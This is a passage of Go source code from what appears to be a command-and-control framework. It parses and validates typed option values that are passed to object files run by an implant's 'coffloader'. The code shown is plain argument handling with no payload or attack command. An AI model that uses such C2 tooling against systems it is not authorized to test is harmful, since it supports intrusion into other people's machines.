	// ── Boolean ────────────────────────────────────────────────────────
	case "bool":
		b, err := strconv.ParseBool(val)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects bool: %w", opt.Name, err)
		}
		return strconv.FormatBool(b), b, nil

	// ── Signed / unsigned integers ─────────────────────────────────────
	// Generic:        int, uint, port
	// COFF aliases:   dword/i/uint32/int32, short/word/int16
	case "int", "dword", "i", "uint32", "int32":
		num, err := strconv.ParseInt(val, 10, 64)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects int: %w", opt.Name, err)
		}
		if opt.Min != nil && float64(num) < *opt.Min {
			return "", nil, fmt.Errorf("option %s below min", opt.Name)
		}
		if opt.Max != nil && float64(num) > *opt.Max {
			return "", nil, fmt.Errorf("option %s above max", opt.Name)
		}
		return fmt.Sprintf("%d", num), float64(num), nil

	case "uint", "port":
		num, err := strconv.ParseUint(val, 10, 64)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects uint: %w", opt.Name, err)
		}
		if opt.Min != nil && float64(num) < *opt.Min {
			return "", nil, fmt.Errorf("option %s below min", opt.Name)
		}
		if opt.Max != nil && float64(num) > *opt.Max {
			return "", nil, fmt.Errorf("option %s above max", opt.Name)
		}
		return fmt.Sprintf("%d", num), float64(num), nil

	case "short", "word", "int16":
		num, err := strconv.ParseInt(val, 10, 16)
		if err != nil {
			return "", nil, fmt.Errorf("option %s expects int16: %w", opt.Name, err)
		}
		return fmt.Sprintf("%d", num), float64(num), nil

	// ── String variants ────────────────────────────────────────────────
	// Generic:       string
	// COFF aliases:  cstr/s/lpstr (UTF-8), wstr/w/lpwstr (UTF-16LE)
	// Both are treated as plain Go strings on the C2 side; the agent's
	// coffloader handles the actual encoding difference.
	case "string", "cstr", "s", "lpstr", "wstr", "w", "lpwstr", "wstring":
		return val, val, nil

	// ── Binary / base64 ───────────────────────────────────────────────
	// Accepted as-is (base64 string); agent unpacks.
	case "binary", "b", "base64":
		return val, val, nil

	default:
		return val, val, nil
	}
}
